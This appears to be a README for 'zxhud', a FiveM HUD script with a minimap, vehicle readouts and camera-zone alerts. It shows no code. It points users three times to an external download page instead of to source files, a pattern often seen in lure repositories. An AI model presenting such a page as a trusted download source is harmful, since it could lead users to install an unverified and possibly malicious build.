# zxhud - FiveM HUD Interface

> A tailored HUD overlay for FiveM servers, built around a dark cyberpunk look with gold highlights, a custom minimap, and live camera status tracking.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-ward74/zxhud-live-camera-hud?style=flat-square)](https://github.com/ben-ward74/zxhud-live-camera-hud)

---

<p align="center">
  <a href="https://ben-ward74.github.io/zxhud-live-camera-hud/">
    <img src="https://img.shields.io/badge/Download-zxhud%20Script-brightgreen?style=for-the-badge" alt="Download zxhud Script">
  </a>
</p>

> **[Direct Download - zxhud](https://ben-ward74.github.io/zxhud-live-camera-hud/)**

---

[Download Latest Build](https://ben-ward74.github.io/zxhud-live-camera-hud/)

---

## What it does

zxhud is a full heads-up display replacement made for FiveM roleplay servers. Its visual style leans into a dark cyberpunk palette with gold accents, giving the interface a sharp futuristic identity without losing readability. In addition to the look and feel, it surfaces key driving and awareness data so players can stay focused on the game world.

This release centers on a polished minimap overlay and a camera-zone surveillance trigger. The HUD shows vehicle details such as speed, fuel, engine condition, and current gear, while the camera indicator and zone detection improve awareness of nearby monitored areas. CSS animation transitions and glassmorphism-inspired panels round out the presentation for a smooth, modern interface.

---

## Features

- Dark cyberpunk styling with gold accent treatment across the HUD
- Custom minimap overlay that takes the place of the default FiveM radar
- Camera status display that reflects the active surveillance state
- Camera zone trigger that fires when players enter monitored areas
- Vehicle telemetry readout for speed, fuel, gear, and engine status
- Fluid CSS animations and glassmorphism panel effects for a refined UI

---

## Installation

1. Download the latest build from the link above.
2. Extract the `zxhud` folder into your FiveM resources directory.
3. Add `ensure zxhud` to your server.cfg file.
4. Restart your server or start the resource manually.

No additional dependencies are required beyond a standard FiveM server environment.

---

## Configuration

Several options can be adjusted through the script configuration file:

| Setting | Default | Description |
|---------|---------|-------------|
| ShowMinimap | true | Toggle the custom minimap overlay |
| ShowVehicleHUD | true | Display speed, fuel, gear, and engine data |
| CameraZoneAlerts | true | Enable notifications when entering camera zones |
| AnimationSpeed | 0.3s | Adjust transition timing for UI elements |

Edit these values in the `config.lua` file located inside the resource folder.

---

## Compatibility

Built for FiveM servers using the latest recommended artifacts build. It has been tested with ESX and QBCore frameworks, though it should also work in other server setups. One known limitation is that the camera zone feature needs server-side integration to operate fully.

---

## FAQ

**How do I install zxhud on my server?**  
Download the resource, move it into your resources folder, add `ensure zxhud` to your server.cfg, and restart the server.

**Will the HUD receive updates?**  
Updates are released from time to time. Visit the download page to check the newest version and changelog.

**Can I customize the colors or layout?**  
Yes. Most visual settings can be changed through the configuration file, and advanced users can also modify the CSS.

**Does this work with other HUD scripts?**  
Using multiple HUD scripts at the same time can lead to conflicts. zxhud is best used as the main HUD overlay.

**Where are saved settings stored?**  
All configuration remains inside the resource folder. No external database is needed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
